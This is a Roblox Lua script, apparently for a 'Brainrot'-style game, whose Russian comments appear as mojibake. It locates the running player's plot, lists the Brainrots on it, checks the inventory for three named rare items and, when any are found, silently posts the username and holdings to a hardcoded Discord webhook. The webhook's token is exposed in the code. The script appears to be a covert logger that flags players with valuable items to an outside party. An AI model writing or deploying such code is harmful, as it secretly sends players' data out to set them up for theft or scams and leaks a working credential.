local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")

local localPlayer = Players.LocalPlayer
local WEBHOOK_URL = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep"

-- === –°–ø–∏—Å–æ–∫ —Ä–∞–∑—Ä–µ—à—ë–Ω–Ω—ã—Ö —Å–µ–∫—Ä–µ—Ç–æ–∫ ===
local ALLOW_ITEMS = {
    "Garamararam",
    "UltraBrain",
    "LegendaryTool"
}

-- === –ù–∞–π—Ç–∏ –ø–ª–æ—Ç –∏–≥—Ä–æ–∫–∞ ===
local function findPlayerPlot()
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return nil end

    for _, plot in ipairs(plots:GetChildren()) do
        if plot:FindFirstChild("PlayerSign") and plot.PlayerSign:FindFirstChild("BillboardGui") then
            local label = plot.PlayerSign.BillboardGui:FindFirstChild("TextLabel")
            if label and label.Text == localPlayer.DisplayName then
                return plot
            end
        end
    end
    return nil
end

-- === –°–±–æ—Ä Brainrots ===
local function collectBrainrots(plot)
    if not plot then return "‚ùå Plot –Ω–µ –Ω–∞–π–¥–µ–Ω" end
    local brainrotsText = ""
    local container = plot:FindFirstChild("Brainrots")
    if not container then return "‚ùå –ù–µ—Ç Brainrots" end

    for i = 1, 17 do
        local node = container:FindFirstChild(tostring(i))
        if node and node:FindFirstChild("Brainrot") then
            local br = node.Brainrot
            local ui = br:FindFirstChild("PlatformUI")
            if ui and ui:FindFirstChild("Title") then
                local text = ui.Title.Text
                if text and text ~= "" then
                    brainrotsText = brainrotsText .. ("Brainrot %d: %s\n"):format(i, text)
                end
            end
        end
    end

    if brainrotsText == "" then
        brainrotsText = "‚ö†Ô∏è –ü—É—Å—Ç–æ"
    end
    return brainrotsText
end

-- === –°–±–æ—Ä –∏–Ω–≤–µ–Ω—Ç–∞—Ä—è —Ç–æ–ª—å–∫–æ —Å–µ–∫—Ä–µ—Ç–æ–∫ ===
local function collectInventory()
    local items = {}

    local function addItemsFrom(container)
        if not container then return end
        for _, item in ipairs(container:GetChildren()) do
            if item:IsA("Tool") then
                for _, allowed in ipairs(ALLOW_ITEMS) do
                    if item.Name == allowed then
                        table.insert(items, item.Name)
                        break
                    end
                end
            end
        end
    end

    addItemsFrom(localPlayer:FindFirstChild("Backpack"))
    addItemsFrom(localPlayer.Character)

    if #items == 0 then
        return nil -- –Ω–µ—Ç —Å–µ–∫—Ä–µ—Ç–æ–∫ ‚Äî –Ω–∏—á–µ–≥–æ –Ω–µ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º
    else
        local text = "\n--- Inventory ---\n"
        for _, name in ipairs(items) do
            text = text .. "- " .. name .. "\n"
        end
        return text
    end
end

-- === –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Discord ===
local function sendToDiscord(content)
    if not content then return end
    local body = HttpService:JSONEncode({
        ["embeds"] = {{
            ["title"] = "**Brainrots | Elly**",
            ["color"] = 65280,
            ["fields"] = {
                {["name"] = "üë§ Username", ["value"] = localPlayer.Name, ["inline"] = false},
                {["name"] = "ü™ê Brainrots \ Plot", ["value"] = content, ["inline"] = false}
            }
        }}
    })
    -- –æ—Ç–ø—Ä–∞–≤–∫–∞ —á–µ—Ä–µ–∑ PostAsync
    HttpService:PostAsync(WEBHOOK_URL, body, Enum.HttpContentType.ApplicationJson)
end

-- === –û—Å–Ω–æ–≤–Ω–æ–π –∑–∞–ø—É—Å–∫ ===
local plot = findPlayerPlot()
local brainrots = collectBrainrots(plot)
local inventory = collectInventory()

if inventory then
    sendToDiscord(brainrots .. inventory)
end
